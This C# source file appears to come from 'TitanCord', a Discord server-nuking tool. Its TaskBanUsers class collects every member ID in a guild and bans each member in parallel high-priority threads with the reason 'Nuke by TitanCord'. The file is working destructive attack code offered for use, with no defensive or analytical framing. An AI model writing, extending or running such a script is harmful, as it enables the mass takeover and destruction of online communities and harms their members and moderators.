public class TaskBanUsers
{
    public static void DoTask(string guildId, TitanCordManager _titanCordManager)
    {
        TitanCordUtils.Log("USERS", $"Obtaining all the User IDs for the guild {guildId}");
        List<ulong> discordUsers = _titanCordManager.GetAllUserIds(ulong.Parse(guildId));
        string userIds = "";

        foreach (ulong discordUser in discordUsers)
        {
            if (userIds == "")
            {
                userIds = discordUser.ToString();
            }
            else
            {
                userIds += ", " + discordUser.ToString();
            }
        }

        TitanCordUtils.Log("USERS", $"Succesfully obtained all the users for the guild {guildId} ({discordUsers.Count} users) => [{userIds}].");
        TitanCordUtils.Log("USERS", "The objective is now to ban all the users. Proceeding.");
        int totalUsers = discordUsers.Count, currentBannedUsers = 0;

        foreach (ulong userId in discordUsers)
        {
            Thread banUserThread = new Thread(() =>
            {
                _titanCordManager.BanUser(guildId, userId.ToString(), "Nuke by TitanCord");
                TitanCordUtils.Log("USERS", $"Banned user {userId.ToString()} successfully.");
                Interlocked.Increment(ref currentBannedUsers);
            });

            banUserThread.Priority = ThreadPriority.Highest;
            banUserThread.Start();
        }

        while (currentBannedUsers != totalUsers)
        {
            Thread.Sleep(1);
        }
    }
}